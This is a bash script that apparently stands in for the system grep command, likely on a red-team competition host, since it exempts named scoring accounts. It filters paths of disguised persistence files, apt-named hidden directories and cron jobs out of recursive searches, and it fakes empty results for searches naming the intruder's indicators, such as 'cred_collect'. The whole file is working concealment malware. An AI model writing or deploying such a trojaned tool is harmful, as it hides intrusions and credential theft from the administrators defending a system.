#!/bin/bash
REAL_GREP="/usr/bin/grep"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_GREP "$@" ;;
esac



HIDDEN_PATHS=(
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_hidden_path() {
    local p="$1"
    for h in "${HIDDEN_PATHS[@]}"; do
        [[ "$p" == "$h" || "$p" == "$h/"* ]] && return 0
    done
    return 1
}

# Also block grep patterns that are clearly hunting for us
BLOCKED_PATTERNS=("bonsly" "chumbucket" "\.sush\." "cred_collect")

for arg in "$@"; do
    for pat in "${BLOCKED_PATTERNS[@]}"; do
        if [[ "$arg" =~ $pat ]]; then
            exit 1  # no matches found
        fi
    done
done

# For recursive grep, filter hidden paths from output
HAS_RECURSIVE=0
for a in "$@"; do
    case "$a" in -r|-R|--recursive) HAS_RECURSIVE=1; break;; esac
done

if [ $HAS_RECURSIVE -eq 1 ]; then
    $REAL_GREP "$@" 2>/dev/null | {
        while IFS= read -r line; do
            path="${line%%:*}"
            _is_hidden_path "$path" || printf '%s\n' "$line"
        done
    }
    exit ${PIPESTATUS[0]}
else
    exec $REAL_GREP "$@"
fi
